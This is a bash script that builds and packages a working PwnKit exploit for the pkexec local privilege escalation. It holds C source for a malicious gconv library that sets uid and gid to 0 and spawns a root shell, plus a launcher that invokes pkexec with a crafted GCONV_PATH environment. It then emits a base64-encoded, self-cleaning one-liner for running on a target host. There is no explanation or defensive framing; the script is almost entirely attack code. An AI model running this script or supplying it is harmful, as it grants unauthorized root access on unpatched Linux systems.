#!/bin/bash
SO_NAME=pwnkit.so
EX_NAME=x

LIB=$(cat << LIB
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {}

void gconv_init(void *step) {
        char * const args[] = { "/bin/sh", NULL };
        char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
        setuid(0);
        setgid(0);
        execve(args[0], args, environ);
        exit(0);
}
LIB
)

EXP=$(cat <<EXP
#include <unistd.h>

int main(int argc, char **argv) {
        char * const args[] = {
                NULL
        };
        char * const environ[] = {
                "$SO_NAME:.",
                "PATH=GCONV_PATH=.",
                "SHELL=/do/not/exists",
                "CHARSET=PWNKIT",
                "GIO_USE_VFS=",
                NULL
        };
        return execve("/usr/bin/pkexec", args, environ);
}
EXP
)

LIB_BIN="$(echo "$LIB" | gcc --shared -fPIC -o /dev/stdout -x c - | gzip | base64 -w0)"
EXP_BIN="$(echo "$EXP" | gcc -o /dev/stdout -x c - | gzip | base64 -w0)"

echo -n 'mkdir -p GCONV_PATH=. && '
echo -n "cp /usr/bin/true GCONV_PATH=./$SO_NAME:. && "
echo -n 'echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules && '
echo -n "echo '$LIB_BIN' | base64 -d | zcat > $SO_NAME && "
echo -n "echo '$EXP_BIN' | base64 -d | zcat > $EX_NAME && "
echo -n "chmod +x $EX_NAME && ./$EX_NAME && rm -rf GCONV_PATH=. gconv-modules $SO_NAME $EX_NAME"